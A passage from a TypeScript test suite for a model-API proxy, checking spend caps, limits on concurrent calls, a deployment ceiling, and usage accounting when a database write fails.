  const list = new Request("http://proxy.test/v1/models", {
    headers: { "x-api-key": env.ANTHROPIC_API_KEY },
  });
  assertEquals((await handler(list)).status, 200);
});

test("the meter reseeds from the trail on first sight: a proxy restart gains a run no headroom", async () => {
  // $1.20 already spent before this process ever saw the run, and long enough ago.
  const { handler, env, clock } = await makeSlice({
    spendUsd: 1,
    backstopMs: 30_000,
    trail: [usageRow({ inputTokens: 600_000, outputTokens: 0 })],
    upstream: () => costing(0.01),
  });
  const buy = () => handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals((await buy()).status, 200, "first sight starts the grace, not the refusal");
  clock.nowMs += 31_000;
  assertEquals((await buy()).status, 403);
});

test("under a spend cap, an unpriced model and an unnamed one are refused; uncapped they pass", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({ spendUsd: 100 });
  const unpriced = await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-imaginary-9" }),
  );
  assertEquals(unpriced.status, 403);
  assertEquals((await unpriced.json()).code, "unpriced");
  const unnamed = await handler(messages(env.ANTHROPIC_API_KEY, { messages: [] }));
  assertEquals(unnamed.status, 403);
  assertEquals(upstreamRequests.length, 0);

  const { handler: free, env: freeEnv } = await makeSlice();
  assertEquals(
    (await free(messages(freeEnv.ANTHROPIC_API_KEY, { model: "claude-imaginary-9" }))).status,
    200,
  );
});

test("calls in flight past the cap answer 429, and the slot frees when the body ends or the caller hangs up", async () => {
  let open = 0;
  const releases: Array<() => void> = [];
  const { handler, env, store } = await makeSlice({
    callsInFlight: 2,
    upstream: () =>
      new Response(
        new ReadableStream({
          start(controller) {
            open += 1;
            releases.push(() => controller.close());
          },
        }),
        { headers: { "content-type": "text/event-stream" } },
      ),
  });
  const buy = () =>
    handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true }));
  const first = await buy();
  const second = await buy();
  const third = await buy();
  assertEquals([first.status, second.status, third.status], [200, 200, 429]);
  assertEquals(await third.json(), {
    error: "too many model calls in flight for this run",
    code: "limit_reached",
    limit: "calls-in-flight",
  });
  assertEquals(open, 2);

  // The first stream ends: its slot is free.
  releases[0]();
  await first.text();
  assertEquals((await buy()).status, 200);
  // The second is abandoned by the caller. The provider is still answering it — the proxy reads
  // on for its usage — so it still holds its slot: hanging up is no way past the cap.
  await second.body!.cancel();
  assertEquals((await buy()).status, 429);
  // Once that answer ends, the slot is free.
  releases[1]();
  await rowsOnceWritten(store, 2);
  assertEquals((await buy()).status, 200);
  assertEquals((await buy()).status, 429);
});

test("a call that fails before the upstream fetch holds no slot", async () => {
  let fails = 2;
  const { handler, env } = await makeSlice({
    callsInFlight: 1,
    decrypt: (sealed) => {
      if (fails-- > 0) return Promise.reject(new Error("kms blink"));
      return Promise.resolve(sealed.replace(/^sealed:/, ""));
    },
  });
  const buy = () => handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  // An unseal that fails is answered, not thrown, and says the key needs re-entering.
  const first = await buy();
  assertEquals(first.status, 409);
  assertEquals((await first.json()).code, "secret_required");
  assertEquals((await buy()).status, 409);
  assertEquals((await buy()).status, 200);
});

test("the deployment's ceiling refuses every purchase at once, with no grace", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    ceiling: { usd: 1, windowDays: 30 },
    upstream: () => costing(0.7),
  });
  const buy = () => handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  await (await buy()).text(); // $0.70
  await (await buy()).text(); // $1.40: reached
  const refused = await buy();
  assertEquals(refused.status, 403);
  assertEquals((await refused.json()).limit, "deployment-spend");
  assertEquals(upstreamRequests.length, 2);
});

test("a usage row is counted toward the caps before it is written, so a failed write still counts", async () => {
  const { handler, store, env, clock } = await makeSlice({
    spendUsd: 1,
    backstopMs: 0,
    upstream: () => costing(2),
  });
  const failing = store.recordUsage;
  store.recordUsage = () => Promise.reject(new Error("database went away"));
  const buy = () => handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  await (await buy()).text(); // $2, never written
  clock.nowMs += 1;
  assertEquals((await buy()).status, 403);
  store.recordUsage = failing;
  assertEquals(await store.listUsageForRun("r-1"), []);
});
